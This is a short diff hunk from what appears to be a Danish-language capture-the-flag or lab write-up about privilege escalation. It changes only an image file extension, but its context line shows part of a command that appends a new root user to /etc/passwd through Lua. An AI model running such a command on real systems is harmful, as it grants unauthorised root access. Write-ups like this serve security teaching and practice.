@@ -150,7 +150,7 @@ TF=$(mktemp) && echo 'local f=io.open("/etc/passwd", "ab"); f:write("\nroot3:OEE
 
 Vi kan køre exploit på remote og prøve at privesc
 
-![revshell](/assets/privesc1.jpg)
+![revshell](/assets/privesc1.JPG)
 
 lol fuck, ok vi skal have en upgraderet shell, her er en god guide til at få en bedre shell
 
